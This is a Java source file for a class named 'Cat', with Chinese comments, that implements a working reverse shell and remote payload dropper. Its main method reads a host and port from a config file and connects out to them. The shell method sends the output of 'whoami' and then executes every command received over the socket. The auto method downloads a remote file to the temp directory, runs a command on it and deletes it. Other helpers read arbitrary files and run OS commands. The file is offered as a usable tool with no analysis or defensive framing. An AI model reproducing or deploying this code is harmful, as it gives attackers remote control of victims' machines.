import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Properties;
import java.util.regex.Pattern;

public class Cat {
	
	static String encoding = "UTF-8";
	
	static{
		encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;
	}

	/**
	 * 获取配置文件
	 * @return
	 * @throws IOException
	 */
	public static Properties getProperties() throws IOException {
		Properties p = new Properties();
        p.load(Cat.class.getClass().getResourceAsStream("/config.properties"));
		return p;
    }
	
	/**
	 * 异常转换成字符串，获取详细异常信息
	 * @param e
	 * @return
	 */
	public static String exceptionToString(Exception e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw, true));
        return sw.toString();
    }
	
	/**
	 * 获取系统文件编码
	 * @return
	 */
	public static String getSystemEncoding(){
		return System.getProperty("sun.jnu.encoding");
	}
	
	/**
     * 非空判断
     *
     * @param obj
     * @return
     */
    public static boolean isNotEmpty(Object obj) {
        if (obj == null) {
            return false;
        }
        return !"".equals(String.valueOf(obj).trim());
    }
	
	/**
	 * 输入流转二进制数组输出流
	 * @param in
	 * @return
	 * @throws IOException
	 */
	public static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException{
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		byte[] b = new byte[1024];
        int a = 0;
        while((a = in.read(b))!=-1){
        	baos.write(b,0,a);
		}
		return baos;
	}
	
	/**
	 * 复制流到文件，如果文件存在默认会覆盖
	 * @param in
	 * @param path
	 * @throws IOException
	 */
	public static void copyInputStreamToFile(InputStream in,String path) throws IOException{
		FileOutputStream fos = new FileOutputStream(path);
		fos.write(inutStreamToOutputStream(in).toByteArray());
		fos.flush();
		fos.close();
	}

	/**
	 * 模仿Linux下的cat Windows下的type 查看文件内容 
	 * @param path
	 * @return
	 * @throws IOException
	 */
	public static String cat(String path) throws IOException {
		return new String(inutStreamToOutputStream(new FileInputStream(path)).toByteArray());
	}

	/**
	 * 执行操作系统命令 如果是windows某些命令执行不了，可以用 cmd /c dir 执行dir命令
	 * @param cmd
	 * @return
	 */
	public static String exec(String cmd) {
		try {
			return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);
		} catch (IOException e) {
			return exceptionToString(e);
		}
	}
	
	/**
	 * 下载文件到指定目录,保存的文件名必须指定
	 * @param url
	 * @param path
	 * @throws MalformedURLException
	 * @throws IOException
	 */
	public static void download(String url,String path) throws MalformedURLException, IOException{
		copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);
	}
	
	/**
	 * 连接远程端口，提供本地命令执行入口
	 * @param host
	 * @param port
	 * @throws UnknownHostException
	 * @throws IOException
	 */
	public static void shell(String host,int port) throws UnknownHostException, IOException{
		Socket s = new Socket(host,port);
		OutputStream out = s.getOutputStream();
		InputStream in = s.getInputStream();
		out.write(("User:\t"+exec("whoami")).getBytes());
		int a = 0;
		byte[] b = new byte[4096];
		while((a=in.read(b))!=-1){
			out.write(exec(new String(b,0,a,"UTF-8").trim()).getBytes("UTF-8"));
		}
	}
	
	/**
	 * 下载远程文件并执行，命令执行完成后会删除下载的文件
	 * @param url
	 * @param fileName
	 * @param cmd
	 * @return
	 * @throws MalformedURLException
	 * @throws IOException
	 */
	public static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{
		String tmpDir = System.getProperty("java.io.tmpdir");
		File tmpFile = new File(tmpDir,fileName);
		download(url, tmpFile.toString());
		String out = exec(cmd.replaceAll(Pattern.quote("${tmpdir}"),tmpDir+File.separator));
		tmpFile.delete();
		return out;
	}
	
	public static Method getMethod(String method){
		Method[] methods = Cat.class.getDeclaredMethods();
		for (int i = 0; i < methods.length; i++) {
			Method m = methods[i];
			if(method.equals(m.getName())){
				return m;
			}
		}
		return null;
	}

	public static void main(String[] args) {
		try {
			Properties p = getProperties();
			shell(p.getProperty("host"), Integer.parseInt(p.getProperty("port")));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
}
